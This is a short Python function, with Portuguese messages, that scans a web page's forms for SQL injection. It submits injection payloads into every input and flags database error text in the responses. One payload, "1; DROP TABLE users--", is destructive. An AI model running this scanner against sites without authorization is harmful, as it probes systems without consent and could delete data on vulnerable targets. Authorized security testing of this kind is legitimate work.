import requests
from urllib.parse import urljoin

def scan_sqli(url, session):
    payloads = ["'", "1' OR '1'='1", "1; DROP TABLE users--"]
    erros = ['sql', 'mysql', 'syntax', 'ora-', 'pgsql']
    resultados = []
    try:
        from bs4 import BeautifulSoup
        r = session.get(url, timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            action = urljoin(url, form.get('action') or '')
            method = form.get('method', 'get').lower()
            for payload in payloads:
                data = {inp.get('name'): payload for inp in form.find_all('input') if inp.get('name')}
                try:
                    resp = session.post(action, data=data) if method == 'post' else session.get(action, params=data)
                    if any(err in resp.text.lower() for err in erros):
                        resultados.append(f"Possível SQLi no formulário: {action} com payload '{payload}'")
                except:
                    pass
        return resultados or ["Nenhum erro de SQLi encontrado"]
    except:
        return ["Falha no teste de SQLi"]